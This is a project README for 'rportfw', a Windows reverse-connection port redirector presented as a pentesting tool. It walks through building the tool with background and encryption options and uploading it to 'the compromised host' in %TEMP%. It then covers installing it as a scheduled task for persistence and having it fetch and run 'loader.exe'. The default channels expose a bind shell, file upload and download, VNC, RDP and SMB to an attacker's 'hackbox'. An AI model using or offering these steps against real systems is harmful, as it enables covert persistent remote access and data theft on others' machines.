# rportfw (Remote Port Forward)

Remote port redirector by reverse connection with proxy support for Windows. Useful in pentesting.

## Features

* Reverse connection through proxy.
* Remote multi port forwarding through a single connection.
* Basic authentication.
* Encryption (optional, rc4).
* Compression (testing, zlib).
* Automatic execution of command associated to port when connecting.
* Includes starter tool loader.
* Includes auto-install function at startup (--install).

## Getting Started

These instructions will get you a copy of the project up and running on your local machine for development and testing purposes.

### Prerequisites

rportfw should compile/run on any Win32 (redirector) and UNIX/Linux box (client). You only need a relatively modern C compiler.

### Installing

Download a copy of the project from github:

```
$ git clone https://github.com/joseigbv/rportfw.git
```

#### rportfw 

Edit 'rportfw.c' and change configuration (optional):

```
#define PROXY_HOST "10.0.0.1" 
#define PROXY_PORT 8080
#define PROXY_AUTH "TVlET01cdXNyMToxMjM0"
```

Compile (E.g. MinGW or cross compiling):

```
C:\> gcc -Wall -s -Os rportfw.c -o rportfw -lwsock32 -DLOADER
```

Directives: 
* Run in background: -DDAEMON -mwindows
* Proxy support: -DPROXY
* Auto-download tools: -DLOADER
* Compression (miniz): -DCOMP
* Encrypt (rc4): -DCRYPT rc4.c 

#### linux client

Edit 'client.c' and change configuration (optional):


```
// puerto de escucha (client)
#define HOST "0.0.0.0"
#define PORT 443 

// contrasenia cifrado
#define SKEY "secret0"

// IP bind 
#define BIND_ADDR "127.0.0.1"

// path nsh y n2f
#define LOADER_PATH "loader.exe"

// puertos a redirigir? 
#define NUM_CHAN 7
#define SET_CHANNELS(chan) { \
\
        chan[0].port = 6666; \
        chan[0].flags = X_CRYPT; \
        chan[1].port = 6667; \
        chan[1].flags = X_CRYPT; \
        chan[2].port = 6668; \
        chan[2].flags = X_CRYPT; \
        chan[3].port = 6669; \
        chan[3].flags = 0; \
        chan[4].port = 5900; \
        chan[4].flags = X_CRYPT; \
        chan[5].port = 3389; \
        chan[5].flags = 0; \
        chan[6].port = 445; \
        chan[6].flags = 0; \
}

// debug ?
#ifdef DEBUG
#define VERBOSE 1
#else
#define VERBOSE 0
#endif
````

Compile: 

```
$ gcc -Wall -O2 client.c rc4.c -o client -lz -DLOADER -DCRYPT -DCOMP -DDEBUG
```

With 'upload.sh' you can build your set tools (loader.exe).

 
### Usage

Upload rportfw.exe to the compromised host (%TEMP%) and execute. For better resilience, create a scheduled task:

```
C:\TEMP> rportfw --install

```

In the linux hackbox, run: 

```
$ client 
``` 

When the compromised computer connects, it will get / execute 'loader.exe'. By default, it redirects several ports:

* 6666: micro bind shell
* 6667: redirect to upload.tmp file
* 6668: redirect from download.tmp file
* 6689: free
* 5900: redirect vnc server 
* 3389: redirect rdp 
* 445: redirect smb 

Now, you can connect for example to RDP: 

```
$ rdesktop localhost
```

## Authors

* **José Ignacio Bravo** - *Initial work* - nacho.bravo@gmail.com

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details

## Acknowledgments

* Christophe Devine - ARC4 algorithm implementation
* Rich Geldreich <richgel99@gmail.com> - miniz zlib-subset implementation
* Greg  Roelofs - unzipsfx.exe 


